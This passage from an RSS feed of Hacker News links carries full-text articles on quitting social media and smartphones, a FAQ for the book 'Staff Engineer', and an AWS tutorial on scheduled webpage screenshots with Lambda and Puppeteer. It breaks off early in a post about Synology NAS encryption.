            <link>https://rustyyato.github.io/type/system,type/families/2021/02/15/Type-Families-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26195079</guid>
            <pubDate>Fri, 19 Feb 2021 16:56:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Living Like It's 99: No Social Media, No Smartphone]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26195076">thread link</a>) | @greghck
<br/>
February 19, 2021 | https://www.alvarez.io/posts/living-like-it-s-99/ | <a href="https://web.archive.org/web/*/https://www.alvarez.io/posts/living-like-it-s-99/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p><img src="https://www.alvarez.io/img/color/l99.jpg" alt="Robot"></p>
<p>At the time of writing this article, I‚Äôve been living without social media for 3 years and without a smartphone for 2 years. Everything started as an experiment motivated by my privacy concerns. I ended up living like that for an entire different reason: peace of mind. You can find a lot of people on internet that have tried this experiment, from a couple of days to an <a href="https://www.youtube.com/watch?v=B0RVWU_nROk">entire month</a>. However I discovered that the brain dependencies created by social media and smartphones take a lot longer to go away (30 days for me). You can‚Äôt really see the effects it has on your life unless you try this kind of experiment for a long time, because you will be stuck in the withdrawal phase that makes you crave dopamine.</p>
<p>Contrary to popular belief, I do not live in a cave where I spend my time coding without any social life, sorry guys ;) I did this experiment while having a busy professional and personal life: I traveled around the world, moved to a new city without knowing anyone, ran <a href="https://www.duple.io/">my own software startup</a>, met new people and made new friends, etc‚Ä¶ So it is possible to live your life the same way, or even better, without a smartphone or social media.</p>
<p>I will share with you my experience leaving social media and my smartphone, the tools I replaced them with, some tips and tricks, people‚Äôs reactions to my experiment, as well as some funny anecdotes.</p>
<h2 id="lets-start-with-why">Let‚Äôs Start With Why</h2>
<h3 id="privacy">Privacy</h3>
<p>The original motivation behind this experiment was privacy. I‚Äôm a professional hacker, the things I can do are scary and I‚Äôm far from being the only one with these skills. <strong>Smartphones are a dream come true for people like me, little spy devices that are 24/7 on you, remotely accessible from anywhere around the world</strong>. Throw social media into the equation, and you can get inside the head of anybody, and make them do whatever you want. Yes, you should be scared. And that‚Äôs even without mentioning all the other <a href="https://lithub.com/what-does-privacy-really-mean-under-surveillance-capitalism/">privacy</a> and <a href="https://the.ink/p/we-can-have-democracy-or-we-can-have">freedom</a> issues that come with <a href="https://techcrunch.com/2019/09/04/facebook-phone-numbers-exposed/">social media</a> and <a href="https://nrkbeta.no/2020/12/03/my-phone-was-spying-on-me-so-i-tracked-down-the-surveillants/">smartphones</a>.</p>
<h3 id="curiosity">Curiosity</h3>
<p>Another reason, which is less dark, was curiosity. I like to experiment and try new things in my life. I was curious about the idea of living without a smartphone and social media especially in a world more connected than ever. And if I didn‚Äôt like the experiment, I could always go back to <a href="https://www.meta-nomad.net/avoiding-the-global-lobotomy/">zombieland</a>.</p>
<h3 id="planned-obsolescence">Planned Obsolescence</h3>
<p>The cherry on top was to stop paying each year for a new smartphone, that does nothing more than the previous one, just because the providers decided to <a href="https://en.wikipedia.org/wiki/Planned_obsolescence">sabotage old models</a> so they <a href="https://en.wikipedia.org/wiki/Batterygate">stop working</a>.</p>
<h3 id="peace-of-mind">Peace of mind</h3>
<p>This is for me the most important reason (even though I discovered it afterwards). The positive effects on your mind, being free from social media and smartphones, are incredible. More on it later.</p>

<blockquote>
<p>‚ÄúTechnology has solved old economics problems by giving us new psychological problems.‚Äù<br>
Mark Manson, The Subtle Art of Not Giving a F*ck</p>
</blockquote>
<p>In 2018 I deleted my accounts from Twitter, Facebook, Instagram and WhatsApp. No coming back, no temptation to reactivate them later on. I kept LinkedIn on standby for professional use although it came close to being deleted as well. WhatsApp got replaced by <a href="https://signal.org/">Signal</a> because Facebook bought them, plus <a href="https://www.forbes.com/sites/parmyolson/2018/09/26/exclusive-whatsapp-cofounder-brian-acton-gives-the-inside-story-on-deletefacebook-and-why-he-left-850-million-behind/">they‚Äôre not really big fan s of privacy</a>.</p>
<p>During that year I kept my smartphone, as I wanted to do the experiment gradually. This decision allowed me to discover something quite counter intuitive about social media and smartphones (more on it later).</p>
<p>From that point on I was reachable by SMS, call, email and Signal. I wasn‚Äôt ready for what happened next. Fasten your seatbelts.</p>
<h3 id="people-thought-i-was-dead">People Thought I Was Dead</h3>
<p>The first reaction people had was to think something bad had happened to me, some of them even thought I was dead. Then something socially curious happened: everybody started speaking to each other on Facebook and WhatsApp to try to figure out what was wrong. Some of them even contacted my family multiple times. They all had my phone number, email address and other ways of contacting me. <strong>However, none of them did</strong>. It was like I had exited the matrix, and was living in another reality.</p>
<h3 id="trustworthiness">Trustworthiness</h3>
<p>I was told that I couldn‚Äôt be trusted since people can‚Äôt check online what I‚Äôm doing when I‚Äôm not around.</p>
<p>Yeah, you read that right.</p>
<p><strong>Society has been brainwashed to believe that privacy is something criminal. Sorry to disappoint, but privacy is a basic fundament of freedom and democracy. That‚Äôs why the voting system is anonymous</strong> [1]. When people tell you ‚Äú<a href="https://write.privacytools.io/freddy/why-privacy-matters-even-if-you-have-nothing-to-hide">If you have nothing to hide, you have nothing to fear</a>‚Äù, what they really mean is ‚Äúdemocracy is overrated, get over it‚Äù.</p>
<p><em>[1] Privacy: you know who I am but not what I do. Anonymity: You know what I do but not who I am. The voting system uses both, privacy when you go vote, anonymity when they count the results.</em></p>
<h3 id="whatsapp">WhatsApp</h3>
<p>This was for me the biggest problem. <a href="https://seirdy.one/2021/01/27/whatsapp-and-the-domestication-of-users.html">Getting people out of WhatsApp</a> if they wanted to talk to me created a lot of friction. Some of them even stopped texting me because they had to open another app on their phone in order to write to me.</p>
<p>Yeah, you also read that right.</p>
<p>I don‚Äôt miss WhatsApp, nor do I miss its endless group talks without anything useful. If you leave one of these groups people look at you as if you did something wrong. In the end I still had access to all the event‚Äôs information I needed despite them being organized on WhatsApp. In regards to this, not having the app didn‚Äôt change my life much.</p>
<p>A trick I‚Äôve developed, when giving my contact info to new people, is to enter my phone number on their smartphone myself, and install Signal for them. This removed a lot of friction. I would then explain my experiment to them and tell them I can only be contacted via this app. I‚Äôve always had a positive reaction. Everybody‚Äôs been curious and asking a lot of questions.</p>
<h3 id="and-then-nothing-happened">And Then Nothing Happened</h3>
<p>During the first weeks without social media, I felt off. As if I was missing out on something big that was happening. Like everybody was having fun except me. Once the <a href="https://joshcsimmons.com/quit-social-media/">withdrawal phase</a> went away, I realized that my life hadn‚Äôt changed that much. I was still doing the same things, talking to the same people, going to the same parties, etc‚Ä¶ It was just more quiet and peaceful.</p>
<p><strong>I was no longer bombarded with pictures of everybody trying to fake a life they‚Äôre not living for the sole purpose of impressing someone else: <a href="https://hbr.org/2017/04/a-new-more-rigorous-study-confirms-the-more-you-use-facebook-the-worse-you-feel">my life had just upgraded</a>.</strong></p>
<p>In the end, after everybody got over their initial shock and calmed down, it became normal for them to contact me using Signal, and life went on as usual.</p>
<h2 id="round-2-goodbye-smartphone">Round 2: Goodbye Smartphone</h2>
<p><img src="https://www.alvarez.io/img/color/l99-2.jpg" alt="Phone"></p>
<p>Unlike social media, smartphones are a lot harder to get rid off. They handle many more things than just simply communicating with people.  I work all day long with a computer, most of what the smartphone was doing could be handled by my laptop. For the rest, I narrowed down my bare essential to Music, Pictures, GPS navigation and of course GSM calls.</p>
<h3 id="the-hardware">The Hardware</h3>
<p>You could solve these problems quite easily using multiple devices, however I wanted to be smart about it and not walk around with a luggage just to carry around all this stuff. After doing some research I figured out the perfect combination and I was even able to reduce the amount of things I had in my pockets.</p>

			</div></div>]]>
            </description>
            <link>https://www.alvarez.io/posts/living-like-it-s-99/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26195076</guid>
            <pubDate>Fri, 19 Feb 2021 16:56:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Staff Engineer: Leadership beyond the management track]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26195073">thread link</a>) | @autoditype
<br/>
February 19, 2021 | https://staffeng.com/book | <a href="https://web.archive.org/web/*/https://staffeng.com/book">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <!-- HEADER -->
    
    <div>
      <div>
        <div>
          <h4>Will I like this book?</h4>
          <p>
	    I think you will, yes! However, since we probably haven't met, I'm not a particularly good judge of that.
	    Rather than trust me, read one of the sections available online
	    (my favorites are <a href="https://staffeng.com/guides/staff-archetypes">Staff engineer archetypes</a>
	    and <a href="https://staffeng.com/guides/work-on-what-matters">Work on what matters</a>),
	    and one or two of the interviews (I'd recommend <a href="https://staffeng.com/stories/ras-kasa-williams">Kasa's</a>
	      and <a href="https://staffeng.com/stories/michelle-bu">Michelle's</a>).
        </p></div>
      </div>
      <div>
        <div>
          <h4>Why write this book?</h4>
          <p>
	    There isn't much out there about being a senior technical leader outside of the management career track.
	    As I've worked with more folks in Staff and Principal engineer roles, this lack of guidance became
	    a point of friction for both them in self-directing their professional development and for me in trying to support
	    their growth. I wrote this book to become a more effective partner for the Staff engineers I work with,
	    and with the hope that it can help others who are chating their path to technical leadership
	    within an organization that's still figuring out how to support them.
	    </p>
        </div>
      </div>
      <div>
        <div>
          <h4>Are you the right author for this book?</h4>
          <p>
	    The role and career of Staff engineers is a topic that deserves to be written about far more than it is written about!
	    My hope is that this book is useful enough that more folks start to write about it,
	    and hopefully quickly surpass this book with better, more useful books of their own.
	  </p>
        </div>
      </div>
      <div>
        <div>
          <h4>Will this advice apply to my company?</h4>
          <p>
	    Advice without context should always be taken with a grain of salt!
	    This book is based on more than a dozen interviews with folks operating in Staff engineer, or equivalent, roles,
	    along with my personal experience leading engineering organizations at Calm, Stripe, and Uber.
	    My hope is that this broad perspective will make the book applicable to your experience,
	    although aspects of the advice are undeniably United States-centric and Silicon Valley-centric.
	  </p>
        </div>
      </div>
      <div>
        <div>
          <h4>Is this content available for free?</h4>
          <p>
	    The vast majority of the writing included in this book is available for free on <a href="https://staffeng.com/">staffeng.com</a>,
	    and will continue to available for free indefinitely. The book's foreword and ending section are not available on the website.
	  </p>
          <p>
	    There are also stories on <a href="https://staffeng.com/">staffeng.com</a>
	    that are not included within the book version.
	  </p>
        </div>
      </div>
      <div>
        <div>
          <h4>Where are the profits from this book going?</h4>
          <p>
	    All profits will be donated to non-profit organizations
	    that work to increase access for underepresented communities in technology.
        </p></div>
      </div>
      <div>
        <div>
          <h4>What formats? PDF? EPUB? MOBI? Print? Audio?</h4>
          <p>If you <a href="https://gumroad.com/l/staff-engineer">buy on Gumroad</a>,
	    you will get access to PDF, EPUB and MOBI versions of the book.
	    If you <a href="https://www.amazon.com/dp/B08RMSHYGG">buy on Amazon</a>, you will get a standard Kindle digital book.
	  </p>
          <p>	  
	    All copies are DRM-free.
	  </p>
          <p>
	    Paperback is available on Amazon.
	    Audio book is planned for Q2, 2021.
	    There are currently no plans for a hardcover edition.
	  </p>
        </div>
      </div>
      <div>
        <div>
          <h4>Where can I buy it?</h4>
          <p>
	    You can buy the <i>Early Edition</i> on <a href="https://gumroad.com/l/staff-engineer">on Gumroad</a>,
	    available from January 28th, 2021. <i>Early Edition</i> includes a near-final version of the book,
	    along with all future updates. The final version will be available on Gumroad from February 7th.
	  </p>
	  <p>
	    The paperback and digital version are also available <a href="https://www.amazon.com/dp/B08RMSHYGG">on Amazon</a>
	    from February 5th.
	  </p>
          <p>
	    Audiobook version is planned for later in 2021, available via Amazon.
        </p></div>
      </div>
      <div>
        <div>
          <h4>How much does it cost?</h4>
          <p>
	    Digital and print versions are offered at $25 USD. Audiobook isn't priced yet.
	    Team and company licenses are available via <a href="https://gumroad.com/l/staff-engineer">Gumroad</a>.
	  </p>
        </div>
      </div>

      <div>
        <div>
          <h4>How can I report an issue or error?</h4>
          <p>
	    Please use <a href="https://airtable.com/shr416F1GqPYr1KqE">this form</a> to report issues!
	  </p>
        </div>
      </div>


    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://staffeng.com/book</link>
            <guid isPermaLink="false">hacker-news-small-sites-26195073</guid>
            <pubDate>Fri, 19 Feb 2021 16:56:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Serverless browser automation with AWS Lambda and Puppeteer]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26195005">thread link</a>) | @EntICOnc
<br/>
February 19, 2021 | https://acloudguru.com/blog/engineering/serverless-browser-automation-with-aws-lambda-and-puppeteer | <a href="https://web.archive.org/web/*/https://acloudguru.com/blog/engineering/serverless-browser-automation-with-aws-lambda-and-puppeteer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p>Manipulating a web browser environment with an API provides a wide range of automation capabilities for developers. It allows you to generate PDF files, screenshot webpages, or run health checks on a website, all from code. It can also enable you to automate form submissions, build UI tests, or diagnose performance issues. <a href="https://chromium.googlesource.com/chromium/src/+/lkgr/headless/README.md">Headless Chromium</a> is a popular package for operating a browser programmatically. Whether you are load testing a website or periodically fetching content, this can be configured with minimal code.&nbsp;</p><p>You can run a headless browser on your local development machine or a remote server. However, many typical browser automation tasks are a good fit for <a href="https://aws.amazon.com/lambda/">AWS Lambda</a>. You can configure a Lambda function to start on a schedule, or in response to an event. You can also configure Lambda to scale up for load testing operations, making it a cost effective alternative to managing a fleet of instances.</p><p>In this blog post, I show how you can deploy a browser automation task to Lambda. This example uses the <a href="https://aws.amazon.com/serverless/sam/">AWS Serverless Application Model</a> (AWS SAM) to simplify the deployment of cloud resources. You can download the code for this blog post from the companion <a href="https://github.com/aws-samples/scheduled-website-screenshot-app">GitHub repository</a>. To deploy to your AWS account, follow the instructions in the <a href="https://github.com/aws-samples/scheduled-website-screenshot-app/blob/main/README.md">README file</a>.</p><h2 id="h-overview">Overview</h2><p>In the example application, a Lambda function is invoked every 15 minutes to take a screenshot of a webpage and save the image to an S3 bucket. The architecture looks like this:</p><figure><img loading="lazy" width="622" height="272" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image001.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image001.png 622w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image001.png 300w" sizes="(max-width: 622px) 100vw, 622px"></figure><ol><li>An <a href="https://aws.amazon.com/eventbridge/">Amazon EventBridge</a> rule invokes the Lambda function using a <a href="https://docs.aws.amazon.com/eventbridge/latest/userguide/scheduled-events.html">schedule expression</a>.</li><li>The Lambda function uses Chromium to load the target webpage. Once the page is loaded and rendered, it takes a screenshot.</li><li>The screenshot is saved to an <a href="https://aws.amazon.com/s3/">Amazon S3</a> bucket.</li></ol><h2 id="h-how-the-code-works">How the code works</h2><p>This Node.js example uses an npm package called <a href="https://github.com/puppeteer/puppeteer">Puppeteer</a>, which exposes a high-level API to control the Chromium browser. A snippet of the <a href="https://github.com/aws-samples/scheduled-website-screenshot-app/blob/main/src/app.js">Lambda function</a> shows how this works:</p><div><div><div><div><pre>browser = await chromium.puppeteer.launch({
 &nbsp; &nbsp; args: chromium.args,
     defaultViewport: chromium.defaultViewport,
 &nbsp;   executablePath: await chromium.executablePath,
     headless: chromium.headless,
     ignoreHTTPSErrors: true,
});

let page = await browser.newPage()
await page.goto(pageURL)
const buffer = await page.screenshot()</pre></div></div></div></div><p>This uses JavaScript <a href="https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous/Async_await">async/await</a> syntax to avoid callbacks and use sequential code flow. Once the browser object is defined, the code instructs Chromium (via Puppeteer) to fetch the webpage. After the page is loaded and the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction">DOM</a> is rendered in the headless Chromium instance, it stores a screenshot of the page in a buffer variable. Finally, the image is written to the S3 bucket:</p><pre>const&nbsp;s3result&nbsp;=&nbsp;await&nbsp;s3
 &nbsp;&nbsp;.upload({
 &nbsp;&nbsp;   Bucket:&nbsp;process.env.S3_BUCKET,
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Key:&nbsp;`${Date.now()}.png`,
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Body:&nbsp;buffer,
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentType:&nbsp;'image/png',
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ACL:&nbsp;'public-read'
 &nbsp;&nbsp;&nbsp;})
 &nbsp;&nbsp;&nbsp;.promise()

console.log('S3 image URL:', s3result.Location) </pre><p>This uses the <a href="https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#upload-property">S3 upload method</a> in the <a href="https://aws.amazon.com/sdk-for-javascript/">AWS SDK for JavaScript</a>. It defines the bucket and key, sets the content type to PNG, and then configures the access control list (ACL) so the object is publicly viewable. Finally, it logs the public URL of the stored object.</p><h2 id="h-packaging-puppeteer-for-the-lambda-function">Packaging Puppeteer for the Lambda function</h2><p>Lambda allows you to package dependencies together with your code as a zip file. The deployment package can be up to <a href="https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-limits.html">250 MB (unzipped)</a> or 50 MB (zipped, for direct upload). For larger packages, it‚Äôs recommended that you use the new <a href="https://acloudguru.com/blog/engineering/packaging-aws-lambda-functions-as-container-images">container packaging format</a> for Lambda functions, which allows packages of up to 10 GB.&nbsp;</p><p>If you use a tool like AWS SAM or <a href="https://www.serverless.com/">Serverless framework</a>, the packages are created on your development machine, then zipped and uploaded to the Lambda service. At runtime, these files are unzipped in the Lambda execution environment when the function is run. These tools can simplify this packaging process and help streamline your deployments.</p><p>However, when you use a dependency that contains a binary, you must ensure that you package a version of the binary that is compatible with the operating system used by Lambda. The Puppeteer package contains an entire Chromium browser bundled into the deployment. Since the browser relies on binaries, npm installs the binary that matches the operating system of your local development machine. However, Lambda requires the binary that matches its underlying operating system, which is Amazon Linux 2.</p><p>To help with this, many popular packages have been converted into <a href="https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html">Lambda layers</a> by the community. You can define up to five layers per Lambda function and these are copied into your deployment package when you create or update a function. For Chromium, this makes it easier to run one binary version in development and use another binary version at runtime. Learn more about <a href="https://aws.amazon.com/blogs/compute/using-lambda-layers-to-simplify-your-development-process/">creating and using Lambda layers</a> to simplify your development process.</p><h2 id="h-using-a-community-maintained-lambda-layer">Using a community-maintained Lambda layer</h2><p>One developer has packaged a <a href="https://github.com/alixaxel/chrome-aws-lambda">Chromium binary for AWS Lambda</a> and published this to GitHub. You can install this with Puppeteer in your Lambda function by including the libraries in package.json. You can also bundle both with an existing public Lambda layer. <a href="https://github.com/shelfio/chrome-aws-lambda-layer">This GitHub repo</a> frequently publishes new versions of the <em>chrome-aws-lambda</em> package, which you can include directly in your Lambda function.</p><p>Layers are only available in the AWS Region where they are published. The maintainers of this public repo have published this layer to 16 Regions and provided layer ARNs in the <a href="https://github.com/shelfio/chrome-aws-lambda-layer/blob/master/readme.md">README file</a>. These ARNs are public and you can include in any Lambda function in those Regions in any AWS account.&nbsp;</p><p>These are many popular libraries that have been bundled into Lambda layers by the community. <a href="https://github.com/mthenw/awesome-layers">This GitHub repo</a> aggregates layers for commonly used utilities like GeoIP, MySQL, OpenSSL, Pandas, scikit-learn, and many others. To use these in your Lambda functions from a compatible runtime, you only need to include the layer ARN in a supported Region.</p><h2 id="h-understanding-the-aws-sam-template">Understanding the AWS SAM template</h2><p>The Lambda function in this example could have been defined directly in the AWS Management Console. However, by using AWS SAM, you can define the same infrastructure as code. This helps create repeatable deployments quickly and reduces human error from clicking around the console.</p><p>The <a href="https://github.com/aws-samples/scheduled-website-screenshot-app/blob/main/template.yaml">AWS SAM template</a> defines all the AW resources used by the application. First, it declares an S3 bucket:</p><pre>&nbsp; S3Bucket:
    Type: AWS::S3::Bucket &nbsp;</pre><p>Next, the template defines the Lambda function and where the code can be found. Since it runs an entire browser within the function, the memory is set to 4096 MB. The timeout is configured to 15 seconds to ensure that the function ends if the target webpage is unresponsive.&nbsp;</p><pre>SnapshotFunction:
 &nbsp; &nbsp; Type: AWS::Serverless::Function
 &nbsp; &nbsp; Description: Invoked by EventBridge scheduled rule
 &nbsp; &nbsp; Properties:
 &nbsp; &nbsp; &nbsp; CodeUri: src/
 &nbsp; &nbsp; &nbsp; Handler: app.handler
 &nbsp; &nbsp; &nbsp; Runtime: nodejs12.x
 &nbsp; &nbsp; &nbsp; Timeout: 15
 &nbsp; &nbsp; &nbsp; MemorySize: 4096 </pre><p>The template includes a reference to the publicly available Chromium layer and substitutes the Region code at deployment time. Providing that the example is deployed in one of those 16 Regions where the layer is available, the layer ARN is valid:</p><pre>Layers:
  - !Sub 'arn:aws:lambda:${AWS::Region}:764866452798:layer:chrome-aws-lambda:22'</pre><p>Environment variables are used to set the target website URL and define the bucket name to store the image. Finally, since the function only writes data to S3, it uses an AWS SAM <a href="https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/serverless-policy-templates.html">policy template</a> to provide write permissions to the single bucket. This follows the <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">principle of least privilege</a>:</p><pre>Environment:
 &nbsp;Variables:
 &nbsp; TARGET_URL: 'https://serverlessland.com'
 &nbsp; S3_BUCKET: !Ref S3Bucket
 Policies:
 &nbsp; - S3WritePolicy:
 &nbsp; &nbsp; &nbsp; BucketName: !Ref S3Bucket </pre><p>Lambda functions are invoked in response to events. In this case, the function runs at a timed interval, which is managed by EventBridge. Using a schedule expression, the template configures the function to run every 15 minutes:</p><pre>Events:
 &nbsp;CheckWebsiteScheduledEvent:
 &nbsp; &nbsp;Type: Schedule
 &nbsp; &nbsp;Properties:
 &nbsp; &nbsp; &nbsp;Schedule: rate(15 minutes) </pre><p>Anytime you make changes to the Lambda function or the resource in this template, run <em>sam deploy</em> again to deploy the new version to the AWS Cloud. The AWS SAM CLI detects the differences between versions and deploys the new code and resources automatically.&nbsp;</p><h2 id="h-testing-the-function">Testing the function</h2><p>After deployment the example application, navigate to the <a href="https://console.aws.amazon.com/lambda/home">Lambda console</a>. Open <em>SnapshotFunction</em> deployed by AWS SAM. The function is invoked automatically every 15 minutes but you can trigger the function by choosing <em>Test</em>:</p><figure><img loading="lazy" width="1008" height="1001" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image002.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image002.png 1008w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image002.png 300w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image002.png 150w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image002.png 768w" sizes="(max-width: 1008px) 100vw, 1008px"></figure><p>The <em>Log output</em> contains details of the function duration and the public URL of the image that is generated and stored in the S3 bucket. Navigate to this URL in a browser to view the screenshot:</p><figure><img loading="lazy" width="874" height="542" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image004.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image004.png 874w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image004.png 300w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image004.png 768w" sizes="(max-width: 874px) 100vw, 874px"></figure><p>After the function has been deployed for a few hours, it has been invoked multiple times by the scheduled event. You can monitor its performance using <a href="https://aws.amazon.com/cloudwatch/">Amazon CloudWatch</a> metric. From the Lambda function, choose <em>Monitoring</em> to see the number of invocations, average duration, and any errors:</p><figure><img loading="lazy" width="1122" height="790" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image006.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image006.png 1122w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image006.png 300w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image006.png 1024w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image006.png 768w" sizes="(max-width: 1122px) 100vw, 1122px"></figure><p>From the <a href="https://s3.console.aws.amazon.com/s3/buckets/">S3 console</a>, open the S3 bucket created by the AWS SAM deployment to see the date-stamped objects created by each Lambda invocation:</p><figure><img loading="lazy" width="985" height="686" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image008.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image008.png 985w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image008.png 300w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image008.png 768w" sizes="(max-width: 985px) 100vw, 985px"></figure><h2 id="h-conclusion">Conclusion</h2><p>Programmatically controlling a web browser enables you to automate many useful tasks with code. For many of these, you can use Lambda to minimize infrastructure overhead and simplify scaling. This blog post shows how to deploy an example application that uses a headless browser to take periodic screenshots of a webpage.</p><p>For commonly used libraries or packages with operating-system specific binaries, Lambda layers can help simplify deployment. Many libraries have publicly maintained layers you can include in your Lambda functions. With infrastructure as code tools like AWS SAM, you can define your code and layers together in YAML, to help create repeatable deployments and accelerate development.</p><p>For more serverless learning resources, visit <a href="https://serverlessland.com/">Serverless Land</a>.</p></div></div></div>]]>
            </description>
            <link>https://acloudguru.com/blog/engineering/serverless-browser-automation-with-aws-lambda-and-puppeteer</link>
            <guid isPermaLink="false">hacker-news-small-sites-26195005</guid>
            <pubDate>Fri, 19 Feb 2021 16:50:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What on Earth is this Encryption Scheme?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26194999">thread link</a>) | @LinuxBender
<br/>
February 19, 2021 | https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/ | <a href="https://web.archive.org/web/*/https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody" id="content"><p>I have taken a couple terabytes of photos over the years, and have a mild phobia of deleting data, so I keep my photos on a <a href="https://www.synology.com/en-global">Synology DiskStation NAS</a>. I‚Äôve got all the files on the thing:</p><ul><li>backed up to the cloud</li><li>encrypted,</li></ul><p>because back in 2016, my <a href="https://www.instagram.com/p/BMpgY9zAGbD/">apartment was broken into and thieves took all the electronics</a>. I‚Äôve been slightly paranoid ever since.</p><p>The Synology NAS generally works pretty well, but the interface for decrypting a drive after booting is <em>extremely</em> painful. It‚Äôs about 10 clicks, a username, two different passwords, and a UI that is kinda wonky (it‚Äôs a desktop in a web browser)? Here‚Äôs a screengrab:</p><figure><video alt="Unlocking an encrypted drive in the Synology DiskStation UI" src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/decrypt.mp4" width="588" muted="" autoplay="" loop="" playsinline=""></video><figcaption><p>22 seconds is my personal speed record.</p></figcaption></figure><p>There are alternative solutions to this ‚Äì you can set it up so that it <a href="https://www.synology.com/en-au/knowledgebase/DSM/tutorial/File_Sharing/How_to_encrypt_and_decrypt_shared_folders_on_my_Synology_NAS#t4_1">reads the encryption key from a USB disk on startup, for example</a> ‚Äì but, if I‚Äôm worried about the whole thing being stolen, it‚Äôs not a good idea to leave the encryption keys plugged into the thing, and it‚Äôs also not a nice UX to find and plug in a USB before turning the thing on.</p><p>This‚Ä¶ seems kinda silly to me, and something that should be solvable with ‚ú® <em>technology</em> ‚ú®. I‚Äôm only ever accessing this from one computer, for example, and every modern operating system has a good credential storage system (think <a 